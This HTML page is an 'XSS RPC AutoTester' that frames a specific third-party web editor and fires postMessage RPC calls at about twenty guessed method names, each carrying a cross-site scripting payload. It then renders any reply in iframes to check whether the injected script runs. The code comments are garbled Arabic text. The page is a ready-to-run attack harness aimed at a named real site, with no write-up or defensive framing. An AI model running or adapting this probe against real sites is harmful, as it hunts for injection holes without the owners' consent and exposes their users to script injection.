<!DOCTYPE html>
<html>
<head>
  <title>XSS RPC Tester</title>
</head>
<body>
  <h1>ğŸ”¥ XSS RPC AutoTester v2</h1>
  <iframe id="evil" src="https://tb.toloka.dev/editor" style="width:100%;height:600px;border:1px solid #000;"></iframe>

  <script>
    const iframe = document.getElementById("evil").contentWindow;
    const origin = "https://tb.toloka.dev";
    const payload = `<iframe srcdoc="<script>top.alert('ğŸ”¥ XSS triggered')<\/script>"></iframe>`;

    const methods = [
      "renderMarkdown", "loadPreview", "getPreview", "injectTemplate", "parseHTML",
      "setContent", "showMarkdown", "convert", "previewTemplate", "parseTemplate",
      "display", "loadMarkdown", "send", "getMessage", "reply", "getData",
      "read", "getText", "render", "echo"
    ];

    let counter = 1;

    // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø±Ø¯ÙˆØ¯
    window.addEventListener("message", function(event) {
      if (event.origin !== origin) return;

      const { type, id, result, error } = event.data || {};
      console.log(`[ğŸ“©] Received: id=${id}, type=${type}`);
      if (error) {
        console.warn(`[âŒ] Error from method id=${id}:`, error);
      } else if (result) {
        console.log(`[âœ…] Result from id=${id}:`, result);

        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¹Ø±Ø¶ Ø¯Ø§Ø®Ù„ iframe Ù„Ø±Ø¤ÙŠØ© ØªØ£Ø«ÙŠØ± XSS
        const preview = document.createElement("iframe");
        preview.style = "width:100%;height:100px;border:1px dashed red;margin:5px;";
        preview.srcdoc = result;
        document.body.appendChild(preview);
      }
    });

    function sendRPC(method, params = []) {
      const id = "xss-test-" + (counter++);
      console.log(`[ğŸš€] Sending RPC: method=${method}, id=${id}`);
      iframe.postMessage({
        type: "RPC",
        method,
        id,
        params
      }, origin);
    }

    // Ø¬Ø±Ø¨ ÙƒÙ„ Ø¯Ø§Ù„Ø© Ù…Ø¹ Ø¹Ø¯Ø© Ø£Ù†ÙˆØ§Ø¹ Ù…Ù† params
    methods.forEach(method => {
      // Ù…Ø¬Ø±Ø¯ payload ÙÙ‚Ø·
      sendRPC(method, [payload]);

      // payload Ù…Ø¹ ÙƒØ§Ø¦Ù†
      sendRPC(method, [payload, { target: "main" }]);

      // payload Ø¶Ù…Ù† ÙƒØ§Ø¦Ù† ÙƒØ¨ÙŠØ±
      sendRPC(method, [{ html: payload, safe: false }]);
    });
  </script>
</body>
</html>
